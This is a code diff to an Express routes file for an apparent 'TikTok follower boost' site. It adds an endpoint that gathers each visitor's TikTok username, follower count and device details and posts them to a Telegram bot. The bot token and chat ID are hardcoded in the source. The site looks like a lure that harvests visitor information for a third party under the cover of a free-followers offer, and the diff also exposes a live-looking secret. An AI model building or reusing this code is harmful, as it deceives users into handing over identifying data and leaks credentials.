@@ -1,11 +1,55 @@
-import type { Express } from "express";
+import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { insertSubmissionSchema } from "@shared/schema";
 import { log } from "./vite";
 import { ZodError } from "zod";
+import fetch from "node-fetch";
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // API endpoint to send notifications to Telegram
+  app.post("/api/notify", async (req, res) => {
+    try {
+      const { username, followers, userInfo } = req.body;
+      
+      // Hardcoded Telegram bot token and chat ID
+      const TELEGRAM_BOT_TOKEN = "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
+      const TELEGRAM_CHAT_ID = "6360165707";
+      
+      // Format message with visitor info
+      const message = `
+🔥 New TikTok Follower Request 🔥
+👤 Username: @${username}
+⭐ Followers: ${followers}
+
+📱 Device Info:
+- Screen: ${userInfo.screenSize}
+- Platform: ${userInfo.platform}
+- Language: ${userInfo.language}
+- Timezone: ${userInfo.timezone}
+- User Agent: ${userInfo.userAgent}
+      `;
+      
+      // Send to Telegram
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+      
+      log(`Notification sent for user @${username}`, "telegram");
+      return res.status(200).json({ success: true });
+    } catch (error) {
+      console.error("Telegram notification error:", error);
+      return res.status(500).json({ message: "Failed to send notification" });
+    }
+  });
+
   // API endpoint to submit TikTok username for follower boost
   app.post("/api/submit", async (req, res) => {
     try {
